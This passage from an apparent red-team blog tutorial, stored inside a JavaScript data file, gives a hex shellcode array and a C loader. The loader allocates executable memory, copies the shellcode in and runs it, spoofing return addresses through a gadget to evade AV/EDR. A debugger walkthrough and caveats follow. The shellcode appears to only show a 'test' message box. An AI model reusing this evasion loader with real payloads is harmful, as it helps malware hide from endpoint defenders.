unsigned char shellcode[] = { 0x57,0x48,0x89,0xe7,0x48,0x83,0xe4,0xf0,0x48,0x83,0xec,0x20,0xe8,0x0f,0x01,0x00,0x00,0x48,0x89,0xfc,0x5f,0xc3,0x66,0x2e,0x0f,0x1f,0x84,0x00,0x00,0x00,0x00,0x00,0x65,0x48,0x8b,0x04,0x25,0x60,0x00,0x00,0x00,0x48,0x8b,0x40,0x18,0x41,0x89,0xca,0x4c,0x8b,0x58,0x20,0x4d,0x89,0xd9,0x66,0x0f,0x1f,0x84,0x00,0x00,0x00,0x00,0x00,0x49,0x8b,0x41,0x50,0x31,0xc9,0x4c,0x8d,0x40,0x02,0x0f,0xb7,0x00,0x66,0x85,0xc0,0x74,0x20,0x66,0x0f,0x1f,0x44,0x00,0x00,0x89,0xca,0x0f,0xb7,0xc0,0x49,0x83,0xc0,0x02,0xc1,0xe2,0x04,0x01,0xd0,0x01,0xc1,0x41,0x0f,0xb7,0x40,0xfe,0x66,0x85,0xc0,0x75,0xe6,0x41,0x39,0xca,0x74,0x09,0x4d,0x8b,0x09,0x4d,0x39,0xcb,0x75,0xc1,0xc3,0x49,0x8b,0x41,0x20,0xc3,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x57,0x56,0x53,0x48,0x63,0x41,0x3c,0x8b,0xbc,0x01,0x88,0x00,0x00,0x00,0x48,0x01,0xcf,0x44,0x8b,0x4f,0x20,0x8b,0x5f,0x14,0x49,0x01,0xc9,0x85,0xdb,0x74,0x51,0x49,0x89,0xcb,0x89,0xd6,0x45,0x31,0xd2,0x66,0x0f,0x1f,0x84,0x00,0x00,0x00,0x00,0x00,0x41,0x8b,0x01,0x31,0xc9,0x4c,0x01,0xd8,0x4c,0x8d,0x40,0x01,0x0f,0xbe,0x00,0x84,0xc0,0x74,0x1c,0x0f,0x1f,0x44,0x00,0x00,0x89,0xca,0xc1,0xe2,0x04,0x01,0xd0,0x01,0xc1,0x4c,0x89,0xc0,0x49,0x83,0xc0,0x01,0x0f,0xbe,0x00,0x84,0xc0,0x75,0xe9,0x39,0xce,0x74,0x11,0x49,0x83,0xc2,0x01,0x49,0x83,0xc1,0x04,0x4c,0x39,0xd3,0x75,0xc0,0x5b,0x5e,0x5f,0xc3,0x8b,0x57,0x24,0x4b,0x8d,0x0c,0x53,0x8b,0x47,0x1c,0x5b,0x5e,0x0f,0xb7,0x14,0x11,0x5f,0x49,0x8d,0x14,0x93,0x8b,0x04,0x02,0x4c,0x01,0xd8,0xc3,0x48,0xb8,0x75,0x73,0x65,0x72,0x33,0x32,0x2e,0x64,0x48,0x83,0xec,0x38,0x48,0x89,0x44,0x24,0x25,0xb8,0x6c,0x6c,0x00,0x00,0x66,0x89,0x44,0x24,0x2d,0xc6,0x44,0x24,0x2f,0x00,0xc7,0x44,0x24,0x20,0x74,0x65,0x73,0x74,0xc6,0x44,0x24,0x24,0x00,0x65,0x48,0x8b,0x04,0x25,0x60,0x00,0x00,0x00,0x48,0x8b,0x40,0x18,0x4c,0x8b,0x50,0x20,0x4d,0x89,0xd1,0x0f,0x1f,0x44,0x00,0x00,0x49,0x8b,0x41,0x50,0x4c,0x8d,0x40,0x02,0x0f,0xb7,0x00,0x66,0x85,0xc0,0x74,0x2a,0x31,0xc9,0x66,0x0f,0x1f,0x44,0x00,0x00,0x89,0xca,0x0f,0xb7,0xc0,0x49,0x83,0xc0,0x02,0xc1,0xe2,0x04,0x01,0xd0,0x01,0xc1,0x41,0x0f,0xb7,0x40,0xfe,0x66,0x85,0xc0,0x75,0xe6,0x81,0xf9,0x00,0x27,0x9b,0x77,0x74,0x3f,0x4d,0x8b,0x09,0x4d,0x39,0xca,0x75,0xbe,0x4c,0x89,0xd9,0xba,0x86,0x45,0x6a,0xef,0xe8,0xd9,0xfe,0xff,0xff,0x48,0x8d,0x4c,0x24,0x25,0xff,0xd0,0xba,0x7f,0x30,0x7b,0xb4,0x48,0x89,0xc1,0xe8,0xc5,0xfe,0xff,0xff,0x48,0x8d,0x54,0x24,0x20,0x45,0x31,0xc9,0x31,0xc9,0x49,0x89,0xd0,0xff,0xd0,0x31,0xc0,0x48,0x83,0xc4,0x38,0xc3,0x4d,0x8b,0x59,0x20,0xeb,0xc3,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 };

int main() {
	STACK_CONFIG Config_1, Config_2, Config_3;
	HMODULE pKernel32Dll;
	UINT64 pAddr, pVirtualAlloc, pCreateThread, pWaitForSingleObject, pGadget;
	HANDLE hThread;

	pGadget = FindGadget();

	if (!pGadget)
		return -1;

	pKernel32Dll = GetModuleHandleA("kernel32");
	pCreateThread = (UINT64)GetProcAddress(pKernel32Dll, "CreateThread");
	pVirtualAlloc = (UINT64)GetProcAddress(pKernel32Dll, "VirtualAlloc");
	pWaitForSingleObject = (UINT64)GetProcAddress(pKernel32Dll, "WaitForSingleObject");

	DBG_PRINT("VirtualAlloc")
	// VirtualAlloc
	if (!SetupConfig((PVOID)pGadget, &Config_1, (PVOID)pVirtualAlloc, 4, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE))
		return -1;
	pAddr = (UINT64)Spoof(&Config_1);
	if (!pAddr)
		return -1;

	DBG_PRINT("Copying Shellcode")
	// Copying Shellcode
	memcpy((void* )pAddr, shellcode, sizeof(shellcode));

	DBG_PRINT("CreateThread")
	// CreateThread
	if (!SetupConfig((PVOID)pGadget, &Config_2, (PVOID)pCreateThread, 6, NULL, 0x00, pAddr, NULL, 0x00, NULL))
		return -1;
	hThread = Spoof(&Config_2);
	if (!hThread)
		return -1;

	DBG_PRINT("WaitForSingleObject")
	// WaitForSingleObject
	if (!SetupConfig((PVOID)pGadget, &Config_3, (PVOID)pWaitForSingleObject, 2, hThread, INFINITE))
		return -1;
	Spoof(&Config_3);


	DBG_PRINT("Successful exit");

	return 0;
}</codeblock><br/>
    <p><i>The final code (written in C by <a href="https://hulkops.gitbook.io/blog/red-team/x64-return-address-spoofing">HulkOps</a>) that this tutorial is based on can be found <a href="https://github.com/HulkOperator/Spoof-RetAddr">
    here</a> on HulkOps Github.</i></p>
    <h1>Debugging the PoC</h1>
    <p>Theoretically, we should now have the ability to call any function with return address spoofing. I've debugged return addres spoofing being used with CreateThread() to show how the process handles once the 
    assembly code jumps to the target function.<br/><br/>
    So, once we jump to the target function in our assembly with <code>jmp r12</code> our code enters <code>kernel32.dll!CreateThreadStub</code>. This means the code has successfully entered the CreateThread function and
    windows is doing what it would do if we normally called CreateThread(). Then, this function hits the <code>ret</code> instruction. This can all be seen in the following image<p>
    <img style="display: block; margin: auto; width: 80%; padding: 10px;" src="/blogdata/17-12-25/returnToSpoofedLibrary.png"/>
    <p>Once the <code>ret</code> instruction executes you will find yourself in a random position within whatever library you chose to spoof to earlier, for me, I find myself in kernel32.dll!wil_details_GetCurrentFeatureEnabledState+0xfa.
    As you can see below, this exact address is at the instruction <code>jmp qword ptr ds:[rbx]</code> or as we should know it, <code>jmp [rbx]</code> meaning our code to find the gadget worked. This instruction then
    executes and since we made rbx point to the address of our cleanup, when <code>jmp [rbx]</code> is called, it enters our cleanup code.</p>
    <img style="display: block; margin: auto; width: 80%; padding: 10px;" src="/blogdata/17-12-25/SpoofedLibraryReturnToCleanup.png"/>
    <p>Once we're in cleanup, the instructions we wrote to restore the stack to its original state execute and we JMP back to main</p>
    <img style="display: block; margin: auto; width: 80%; padding: 10px;" src="/blogdata/17-12-25/CleanupReturnToMain.png"/>
    <p>As you can see here, we're back in the main thread after <code>jmp [rbx]</code>.</p>
    <img style="display: block; margin: auto; width: 80%; padding: 10px;" src="/blogdata/17-12-25/ReturnedMain.png"/>
    <h1>Caviats</h1>
    <p>So, Return address spoofing seems like a great method of avoiding detection. Wouldn't that be nice! (it isn't.) In truth, return address spoofing is outdated. New techniques such as stack unwinding where an AV/EDR
    walks the stack counter return address spoofing. This method might still work against primitive forms of AV/EDR's but truthfully, it's nowhere near a high quality technique.</p>
    <h1>Conclusion</h1>
    <p>If you feel some concepts could use better clarification or you need some support in your programming feel free to contact me on any social media listed on the homepage and I'll try to see if I can help. I've tried my
    hardest to keep information abstracted as little as possible whilst keeping it somewhat readable, so I apologise if certain areas seem too wordy or convoluted. Thanks for reading.</p>
    <h1>Appendicies</h1>
    <p>
    <br/>&nbsp;&nbsp;&nbsp;&nbsp;- <a href="https://hulkops.gitbook.io/blog/red-team/x64-return-address-spoofing">HulkOps return address spoofing article</a>
    <br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\\_This was such a help to the creation of this article. Thanks a ton to HulkOps.
    <br/>&nbsp;&nbsp;&nbsp;&nbsp;- <a href="https://chatgpt.com">ChatGPT</a>
    <br/>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\\_Used responsibly to help me get a better understanding of some concepts I had trouble getting a grasp of.
    </p>
    `
    }
  };
  
  export default blogPosts;